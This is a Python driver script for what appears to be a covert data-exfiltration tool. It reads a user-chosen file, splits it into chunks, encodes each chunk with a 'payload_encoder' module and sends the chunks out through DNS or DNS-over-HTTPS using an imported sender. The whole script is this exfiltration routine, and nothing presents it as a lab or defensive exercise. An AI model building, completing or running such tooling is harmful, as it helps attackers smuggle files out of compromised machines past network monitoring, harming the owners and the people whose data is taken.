import os
from encoder.payload_encoder import encode_chunk
from dns_sender import sender
from config.settings import CONFIG

def read_chunks(filepath, size):
    with open(filepath, "rb") as f:
        while True:
            chunk = f.read(size)
            if not chunk:
                break
            yield chunk

def main():
    path = input("Enter path to file: ")
    if not os.path.exists(path):
        print(f"[!] File not found: {path}")
        return

    print(f"[✓] File found. Reading from: {path}")
    method = "doh" if CONFIG["USE_DOH"] else "dns"
    print(f"[+] Using method: {method.upper()}")

    total_chunks = 0
    for chunk in read_chunks(path, CONFIG["CHUNK_SIZE"]):
        encoded = encode_chunk(chunk)
        print(f"[+] Chunk {total_chunks + 1} encoded: {encoded[:10]}...")  # debug
        sender.send_encoded_chunk(encoded, method)
        total_chunks += 1

    print(f"[✓] File transmission complete. Total chunks sent: {total_chunks}")


if not os.path.exists("logs"):
    os.makedirs("logs")

if __name__ == "__main__":
    main()

